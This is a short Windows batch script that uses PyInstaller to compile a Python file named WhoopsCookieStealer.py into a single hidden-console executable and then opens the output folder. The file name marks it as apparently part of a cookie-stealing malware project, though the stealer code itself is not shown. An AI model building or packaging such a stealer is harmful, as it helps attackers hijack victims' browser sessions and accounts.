@echo off

cls
pyinstaller --onefile --noconfirm --specpath %temp% --distpath .\Compiled --workpath %temp% --windowed WhoopsCookieStealer.py
explorer .\Compiled